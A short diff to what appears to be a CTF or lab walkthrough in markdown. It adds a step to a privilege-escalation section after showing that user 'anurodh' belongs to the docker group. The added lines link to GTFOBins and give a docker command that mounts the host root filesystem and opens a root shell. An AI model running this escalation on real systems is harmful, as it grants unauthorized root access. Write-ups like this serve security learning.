@@ -220,6 +220,10 @@ id
 uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
 ```
 
-Now we have to docker
+Now we have to exploit docker :
+https://gtfobins.org/gtfobins/docker/
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+```
 
 ![[Pasted image 20260210021319.png]]
